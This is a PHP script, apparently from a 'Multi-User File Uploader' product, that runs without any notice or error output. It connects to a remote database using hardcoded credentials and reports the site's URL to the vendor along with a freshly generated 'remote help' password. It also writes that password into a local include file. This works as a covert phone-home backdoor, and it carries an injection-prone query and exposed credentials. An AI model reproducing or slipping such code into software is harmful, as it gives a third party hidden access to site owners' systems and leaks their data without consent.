<?php
	$rh_db = @mysql_connect('db.bkworksproducts.org','bkworksp_ph','bkworksph');
	@mysql_select_db('bkworksp_ph',$rh_db);
	$remote_help_pw = md5(sha1(time()));
	$product = 'Multi-User File Uploader';
	$url = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
	$date = @date('M d Y g:i T');
	$query = "INSERT INTO ph (
		product,
		version,
		url,
		date_time,
		help_pw
	) VALUES (
		'$product',
		'$software[version]',
		'$url',
		'$date',
		'$remote_help_pw'
	)";
	@mysql_query($query,$rh_db);
	@$rh_file = fopen('../include/rh.php','w');
	@fwrite($rh_file,'<?php' . "\n");
	@fwrite($rh_file,'$software["rh"] = 1;' . "\n");
	@fwrite($rh_file,'$remote_help_pw = "' . $remote_help_pw . '";');
	@fwrite($rh_file,"\n" . '?>');
	@fclose($rh_file);
	@mysql_close($rh_db);
?>